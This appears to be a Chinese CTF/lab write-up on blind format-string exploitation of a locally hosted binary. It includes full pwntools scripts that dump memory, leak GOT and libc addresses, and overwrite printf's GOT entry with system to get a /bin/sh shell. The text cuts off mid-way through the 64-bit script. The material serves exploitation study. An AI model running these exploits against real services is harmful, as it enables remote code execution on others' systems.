class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p32(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">    ret = r.recvuntil(<span class="string">&quot;.TMP&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, binascii.hexlify(ret), <span class="built_in">len</span>(ret)</span><br><span class="line">    remain = r.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># name</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;nameaaa&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">begin = <span class="number">0x8048000</span></span><br><span class="line">text_seg =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ret = leak(begin)</span><br><span class="line">        text_seg += ret</span><br><span class="line">        begin += <span class="built_in">len</span>(ret)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ret) == <span class="number">0</span>:   <span class="comment"># nil</span></span><br><span class="line">            begin +=<span class="number">1</span></span><br><span class="line">            text_seg += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span> e</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+]&#x27;</span>,<span class="built_in">len</span>(text_seg)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump_bin&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text_seg)</span><br></pre></td></tr></table></figure><p><strong>注解</strong>：</p><ul><li>19-21 行：处理无关泄露的程序流程后，进入格式化字符串漏洞输入状态</li><li>24 行：32 位系统加载地址</li><li>9 行：”%9$s.TMP” 中的 .TMP 既是填充对齐，也是分隔符，方便后面处理数据</li><li>14 行：使用binascii 将泄漏出来字符串每一个都从 ascii 转换为 十六进制，方便显示</li><li>15 行：r.recvrepeat(0.2) 接受返回的垃圾数据，方便下一轮的输入</li><li>30 行：泄漏地址动态增加，假如泄漏 1 字节就增加 1 ；泄漏 3 字节就增加 3 </li><li>31-33 行：处理泄漏长度为 0 ，也就是数据是 \x00 的情况。地址增加 1 ，程序数据加 \x00</li></ul><p>运行之后，耐心等待泄漏完成。泄漏出来的程序是不能运行的，但可以在 ida 进过处理可以进行分析、找 plt 、got.plt 等。</p><p>将泄漏出来的程序，放入 ida ，启动时选择<strong>以 binary file 加载</strong>，勾选 <strong>Load as code segment</strong>，并**调整偏移为： 0x8048000 **（开始泄露的地址）：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-26-oxwzGb3pT5h8FyVj.png"></p><p>可以通过 shift+F12 查字符串定位到 main 函数，然后直接 F5 反编译：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200626230020.png"></p><p>基本结构已经出来了，盲打没有源代码，就需要根据传入参数去判断哪个 sub_xxx 是哪个函数了。比如输出格式化字符串的 sub_8048490 就是 printf 。</p><h4 id="从-text-段开始"><a href="#从-text-段开始" class="headerlink" title="从 .text 段开始"></a>从 .text 段开始</h4><p>程序启动过程：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200627002443.png"></p><p>从 _start 函数开始就是 .text 段，可以在 ida 中打开一个正常的 binary 观察 text 段开头第一个函数就是 _stat ：（图为 32 位程序）</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-27-ClxPYjJqw26gj8Ff.png"></p><p>先用 %p 泄露出栈上数据，找到两个相同地址，而且这个地址很靠近程序加载初地址（32位：0x8048000；64位：0x400000）。脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;nameaaa&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">where_is_start</span>(<span class="params">ret_index=null</span>):</span></span><br><span class="line">    return_addr=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">        payload = <span class="string">&#x27;%%%d$p.TMP&#x27;</span> % (i)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">        val = p.recvuntil(<span class="string">&#x27;.TMP&#x27;</span>)</span><br><span class="line">        log.info(<span class="built_in">str</span>(i*<span class="number">4</span>)+<span class="string">&#x27; &#x27;</span>+val.strip().ljust(<span class="number">10</span>))</span><br><span class="line">        <span class="keyword">if</span>(i*<span class="number">4</span>==ret_index):</span><br><span class="line">            return_addr=<span class="built_in">int</span>(val.strip(<span class="string">&#x27;.TMP&#x27;</span>).ljust(<span class="number">10</span>)[<span class="number">2</span>:],<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">return</span> return_addr</span><br><span class="line">        p.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line"></span><br><span class="line">start_addr=where_is_start()</span><br></pre></td></tr></table></figure><p>最后在偏移 1164 和 1188 找到 text 段地址 0x8048510 ，可以对比上图，上图是这条例题的截图：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-27-Z0d5pjXygPrfk4kN.png"></p><p>泄露脚本和前面一样只需要修改一下起始地址：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span> </span><br><span class="line">r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p32(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">    ret = r.recvuntil(<span class="string">&quot;.TMP&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, binascii.hexlify(ret), <span class="built_in">len</span>(ret)</span><br><span class="line">    remain = r.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># name</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;nameaaa&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">begin = <span class="number">0x8048510</span></span><br><span class="line"><span class="comment">#begin = 0x8048000</span></span><br><span class="line">text_seg =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ret = leak(begin)</span><br><span class="line">        text_seg += ret</span><br><span class="line">        begin += <span class="built_in">len</span>(ret)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ret) == <span class="number">0</span>:   <span class="comment"># nil</span></span><br><span class="line">            begin +=<span class="number">1</span></span><br><span class="line">            text_seg += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span> e</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+]&#x27;</span>,<span class="built_in">len</span>(text_seg)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump_bin_text&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text_seg)</span><br></pre></td></tr></table></figure><p>将泄露文件放入 ida 分析，启动时选择<strong>以 binary file 加载</strong>，勾选<strong>Load as code segment</strong>，并**调整偏移为： 0x8048510 **（开始泄露地址）：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-27-Z6eK911DhQLF67iW.png"></p><p>找到 main 函数在 0x0804860B ，需要将这部分定义为函数才能反编译，右键地址隔壁的名称 loc_804860B ，creat function 。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-27-7UJQNJKfvUPjVkZT.png"></p><p>红色部分就是没有泄露出来的函数，后面跟的就是函数 plt 地址。</p><p>两种方法各有不同，结合实际使用。</p><h3 id="解题流程"><a href="#解题流程" class="headerlink" title="解题流程"></a>解题流程</h3><p>着重记录<strong>格式化字符串盲打</strong>，不一步一步分析这道题目漏洞（详细分析：<a href="https://momomoxiaoxi.com/2017/12/26/Blindfmtstr/">默小西</a>博客）。这道题目思路是：</p><ol><li>确定 printf 的 plt 地址</li><li>通过泄露 plt 表中的指令内容确定对应的 got.plt 表地址</li><li>通过泄露的 got.plt 表地址泄露 printf 函数的地址</li><li>通过泄露的 printf 的函数地址确定 libc 基址，从而获得 system 地址</li><li>使用格式化字符串的任意写功能将 printf 的 got.plt 表中的地址修改为 system 的地址</li><li>send 字符串 “/bin/sh” ，那么在调用 printf(“/bin/sh”) 的时候实际上调用的是 system(“/bin/sh;”) ，从而成功获取shell</li></ol><h4 id="确定-printf-的-plt-地址"><a href="#确定-printf-的-plt-地址" class="headerlink" title="确定 printf 的 plt 地址"></a>确定 printf 的 plt 地址</h4><p>将泄露出来的程序，放入 ida 中分析获得，函数名后半截就是地址 0x8048490 ：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200626231225.png"></p><h4 id="泄露-got-plt"><a href="#泄露-got-plt" class="headerlink" title="泄露 got.plt"></a>泄露 got.plt</h4><p>和泄露程序 payload 高度相似：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%9$sskye&quot;</span> + p32(printf_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># \xff\x25 junk code</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;right:\xff\x25&#x27;</span>)</span><br><span class="line">printf_got_plt = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><p><strong>注解：</strong></p><p>为什么接收 ‘right:\xff\x25’ ？</p><p>right: 是固定回显，\xff\x25 是无用字节码。实际上 0x8048490 的汇编是这样的：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> pdisass 0x8048490</span> </span><br><span class="line"> ► 0x8048490 &lt;printf@plt&gt;       jmp    dword ptr [0x804a018] &lt;0xf7e4d670&gt;</span><br><span class="line"> </span><br><span class="line">   0x8048496 &lt;printf@plt+6&gt;     push   0x18</span><br><span class="line">   0x804849b &lt;printf@plt+11&gt;    jmp    0x8048450</span><br><span class="line"><span class="meta">#</span><span class="bash"> 字节码</span></span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /20wx 0x8048490</span></span><br><span class="line">0x8048490 &lt;printf@plt&gt;:0xa01825ff0x186808040xe90000000xffffffb0</span><br></pre></td></tr></table></figure><p>0x8048490 指向是一条跳转 got.plt 指令，我们需要其中跳转的目标地址。\xff\x25 就是跳转指令的字节码，我们就要先接收 2 字节垃圾数据，然后再接收 4 字节的 got.plt 地址。</p><h4 id="泄露-printf-函数的地址"><a href="#泄露-printf-函数的地址" class="headerlink" title="泄露 printf 函数的地址"></a>泄露 printf 函数的地址</h4><p>构造方法同上，但不需要接收 2 字节垃圾数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%9$sskye&quot;</span> + p32(printf_got_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">printf_got = u32(p.recv(<span class="number">4</span>))</span><br></pre></td></tr></table></figure><h4 id="泄露-libc-基址-amp-system-地址"><a href="#泄露-libc-基址-amp-system-地址" class="headerlink" title="泄露 libc 基址&amp; system 地址"></a>泄露 libc 基址&amp; system 地址</h4><p>题目没有给出 libc 。从泄露出来的 printf@got 去 libcdatabase 查询其他函数偏移。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf:0x00049670</span><br><span class="line">system:0x0003ada0</span><br></pre></td></tr></table></figure><h4 id="任意写修改-112-114-x69-x6e-116-x66-x40-x67-111-116-x2e-x70-108-x74"><a href="#任意写修改-112-114-x69-x6e-116-x66-x40-x67-111-116-x2e-x70-108-x74" class="headerlink" title="任意写修改 &#112;&#114;&#x69;&#x6e;&#116;&#x66;&#x40;&#x67;&#111;&#116;&#x2e;&#x70;&#108;&#x74;"></a>任意写修改 <a href="mailto:&#112;&#114;&#x69;&#x6e;&#116;&#x66;&#x40;&#x67;&#111;&#116;&#x2e;&#x70;&#108;&#x74;">&#112;&#114;&#x69;&#x6e;&#116;&#x66;&#x40;&#x67;&#111;&#116;&#x2e;&#x70;&#108;&#x74;</a></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;printf_got_plt: system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : leakmemory_remote.py</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p32(addr)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">    resp = p.recvuntil(<span class="string">&quot;.TMP&quot;</span>)</span><br><span class="line">    ret = resp[:-<span class="number">4</span>:]</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, binascii.hexlify(ret), <span class="built_in">len</span>(ret)</span><br><span class="line">    remain = p.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">printf_plt = <span class="number">0x8048490</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># name</span></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;nameaaa&#x27;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak printf@got.plt</span></span><br><span class="line">payload = <span class="string">&quot;%9$sskye&quot;</span> + p32(printf_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># \xff\x25 junk code</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;right:\xff\x25&#x27;</span>)</span><br><span class="line">printf_got_plt = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;printf_got_plt:&quot;</span>+<span class="built_in">hex</span>(printf_got_plt))</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak printf@got</span></span><br><span class="line">payload = <span class="string">&quot;%9$sskye&quot;</span> + p32(printf_got_plt)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">printf_got = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">log.info(<span class="string">&quot;printf_got:&quot;</span>+<span class="built_in">hex</span>(printf_got))</span><br><span class="line"></span><br><span class="line"><span class="comment"># libcdatabase</span></span><br><span class="line">libc_base = printf_got - <span class="number">0x00049670</span></span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + <span class="number">0x0003ada0</span></span><br><span class="line">log.info(<span class="string">&quot;system_addr:&quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># overwrite</span></span><br><span class="line">payload = fmtstr_payload(<span class="number">7</span>, &#123;printf_got_plt: system_addr&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="64-位利用手法"><a href="#64-位利用手法" class="headerlink" title="64 位利用手法"></a>64 位利用手法</h2><h3 id="实验环境准备-1"><a href="#实验环境准备-1" class="headerlink" title="实验环境准备"></a>实验环境准备</h3><p>还是使用 32 位的例题源码，编译 64 位程序：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -z execstack -fno-stack-protector -o leakmemory_64 leakmemory.c</span><br></pre></td></tr></table></figure><p>用 socat 挂到端口 10001 上部署：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socat TCP4-LISTEN:10000,fork EXEC:./leakmemory</span><br></pre></td></tr></table></figure><p>实验环境完成，如果是本地部署的话，等等在 exp 里面写 remote(“127.0.0.1”,10000) 模拟没有 binary 的远程盲打。</p><h3 id="确定程序的位数-1"><a href="#确定程序的位数-1" class="headerlink" title="确定程序的位数"></a>确定程序的位数</h3><p>填充 8 字节，然后再填入 %p  ，回显长度是 8 字节。</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200627113511.png"></p><h3 id="确定格式化字符串偏移-1"><a href="#确定格式化字符串偏移-1" class="headerlink" title="确定格式化字符串偏移"></a>确定格式化字符串偏移</h3><p>最后确认偏移为 8 。</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-27-2r7Ig0pKhjZRYcl3.png"></p><h3 id="dump-程序-1"><a href="#dump-程序-1" class="headerlink" title="dump 程序"></a>dump 程序</h3><p>从程序加载地方开始，或者从 text 段开始可以的。这里不再找 text 段起始位置，直接从程序加载地方开始泄露。两个位数程序脚本通用的，改一下参数即可。</p><p><strong>64 位程序加载起始地址是：0x400000</strong>，下面是对比图：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-06-26-CTSvll4wMcTxU1DR.png"></p><p>脚本还是那个脚本，改一下参数即可：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span> </span><br><span class="line"><span class="comment">#r = remote(&#x27;127.0.0.1&#x27;,10001)</span></span><br><span class="line">r = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">addr</span>):</span></span><br><span class="line">    payload = <span class="string">&quot;%9$s.TMP&quot;</span> + p64(addr)</span><br><span class="line">    r.sendline(payload)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;leaking:&quot;</span>, <span class="built_in">hex</span>(addr)</span><br><span class="line">    r.recvuntil(<span class="string">&#x27;right:&#x27;</span>)</span><br><span class="line">    ret = r.recvuntil(<span class="string">&quot;.TMP&quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ret:&quot;</span>, binascii.hexlify(ret), <span class="built_in">len</span>(ret)</span><br><span class="line">    remain = r.recvrepeat(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="comment"># name</span></span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">&#x27;moxiaoxi&#x27;</span>)</span><br><span class="line">r.recv()</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak</span></span><br><span class="line">begin = <span class="number">0x400000</span><span class="comment">#0x8048000</span></span><br><span class="line">text_seg =<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        ret = leak(begin)</span><br><span class="line">        text_seg += ret</span><br><span class="line">        begin += <span class="built_in">len</span>(ret)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(ret) == <span class="number">0</span>:   <span class="comment"># nil</span></span><br><span class="line">            begin +=<span class="number">1</span></span><br><span class="line">            text_seg += <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span> e</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;[+]&#x27;</span>,<span class="built_in">len</span>(text_seg)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump_bin_64&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(text_seg)</span><br></pre></td></tr></table></figure><p>ida 加载参数如图：</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200627120919.png"></p><p>通过字符串定位到 main 函数，这里没有识别为函数，需要手动创建函数。在 0x0400826 右键 creat function ，然后就可以反汇编了。</p><p>点进 printf@plt ，里面是跳转到 <a href="mailto:&#112;&#114;&#105;&#110;&#x74;&#102;&#x40;&#103;&#111;&#116;&#46;&#x70;&#108;&#116;">&#112;&#114;&#105;&#110;&#x74;&#102;&#x40;&#103;&#111;&#116;&#46;&#x70;&#108;&#116;</a> 指令，也就是从 ida 知道了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">printf_plt &#x3D; 0x4006B0</span><br><span class="line">printf_got_plt &#x3D; 0x601030</span><br></pre></td></tr></table></figure><p>解题思路与 32 位一致，利用脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 